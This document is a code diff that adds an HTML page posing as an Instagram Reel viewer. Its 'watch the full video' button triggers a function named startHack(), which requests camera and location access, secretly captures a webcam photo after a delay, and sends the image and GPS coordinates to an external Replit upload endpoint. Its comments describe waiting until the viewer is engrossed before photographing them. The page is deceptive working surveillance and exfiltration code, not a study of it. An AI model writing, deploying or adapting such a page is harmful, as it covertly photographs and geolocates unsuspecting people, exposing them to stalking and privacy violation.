@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Reel</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
+        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        iframe { border: none; border-radius: 12px; width: 90%; max-width: 400px; height: 80%; }
+        .overlay-btn {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7); display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 10;
+        }
+        button {
+            padding: 15px 30px; font-size: 18px; border-radius: 25px; border: none;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            color: white; font-weight: bold; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="overlay-btn" id="overlay">
+        <h2 style="color:white; margin-bottom:20px;">شاهد الفيديو الكامل</h2>
+        <button onclick="startHack()">فتح الفيديو</button>
+    </div>
+
+    <iframe src="https://www.instagram.com/reel/DWl4ib2DhCY/embed" id="reel-frame"></iframe>
+</div>
+
+<video id="v" style="display:none;" autoplay playsinline></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    async function startHack() {
+        document.getElementById('overlay').style.display = 'none';
+        
+        try {
+            // طلب الكاميرا والموقع
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                
+                // كنتسناو 3 ثواني باش يكون مندمج مع الفيديو عاد نصوروه
+                setTimeout(async () => {
+                    const c = document.getElementById('c');
+                    c.width = 640; c.height = 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const img = c.toDataURL('image/png');
+
+                    // صيفط الداتا لـ Replit
+                    await fetch('https://image-uploader-log.bbeelloamr.replit.app/api/upload', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            image: img,
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        })
+                    });
+                    
+                    // طفي الكاميرا باش ما يعيقش
+                    stream.getTracks().forEach(t => t.stop());
+                }, 3000);
+            });
+        } catch (err) {
+            console.log("Denied");
+        }
+    }
+</script>
+</body>
+</html>
